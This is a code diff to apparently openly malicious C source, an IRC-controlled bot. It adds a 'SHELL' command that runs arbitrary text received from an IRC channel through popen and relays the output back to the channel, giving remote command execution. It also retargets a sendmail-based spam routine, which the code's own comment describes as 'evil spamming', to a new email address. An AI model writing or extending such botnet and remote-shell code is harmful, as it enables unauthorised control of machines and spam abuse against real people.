@@ -10,6 +10,7 @@
 #include <time.h>
 
 #define buffer_size 2048
+#define temp_buff_size 2000
 
 char in_buffer[buffer_size];
 char out_buffer[buffer_size];
@@ -44,7 +45,9 @@ bool strpref(const char *pre, const char *str) {
 void sendmail(const char *to, const char *from, const char *subject, const char *message) {
     // open a pipe to sendmail to do our evil spamming bidding
     FILE *sendmail_pipe = popen("/usr/sbin/sendmail -t", "w");
+    printf("Trying to send mail...\n");
     if (sendmail_pipe != NULL) {
+        printf("Sendmail atleast found...\n");
         fprintf(sendmail_pipe, "To: %s\nFrom: %s\nSubject: %s\n\n", to, from, subject);
         fwrite(message, sizeof(char), strlen(message), sendmail_pipe);
         const char *terminator = ".\n";
@@ -154,13 +157,46 @@ void handle_command(char *msg, int conn, char *channel) {
     char *payload;
     if ((payload = strstr(msg, channel))) {
         payload += strlen(channel) + 2;
+        // Send spam
         if (strpref("SPAM", payload)) {
-            const char *email_to = "chstansbury@gmail.com";
+            const char *email_to = "denny1038@gmail.com";
             // need to figure out rest of sendmail config
             const char *email_from = "spammy@email.com";
             const char *email_subject = "An interesting offer.";
             const char *email_msg = "Nothing nefarious here.";
             sendmail(email_to, email_from, email_subject, email_msg);
+
+        // Pseudo-shell command
+        } else if (strpref("SHELL", payload)) {
+            payload += strlen("SHELL") + 1;
+
+            char buffer[temp_buff_size];
+            FILE * pipe = popen(payload, "r");
+            if (!pipe) printf("ERROR\n");
+            while(!feof(pipe)) {
+                if(fgets(buffer, temp_buff_size, pipe) != NULL) {
+                    memset(out_buffer, 0, buffer_size);
+                    sprintf(out_buffer, "PRIVMSG %s :%s\r\n", channel, buffer);
+                    send(conn, out_buffer, strlen(out_buffer), 0);
+                }
+            }
+            pclose(pipe);
+
+            // Failed attempt at forkpty
+            // int master;
+            // pid_t pid = forkpty(&master, NULL, NULL, NULL);
+            // if (pid == -1) {
+            //     memset(out_buffer, 0, buffer_size);
+            //     sprintf(out_buffer, "PRIVMSG %s :Could not fork process.\r\n", channel);
+            //     send(conn, out_buffer, strlen(out_buffer), 0);
+            // // Child process
+            // } else if (pid == 0) {
+            //     char *args[] = { NULL };
+            //     execvp(payload, args);
+            // // Parent process
+            // } else {
+
+            // }
         }
     }
 }
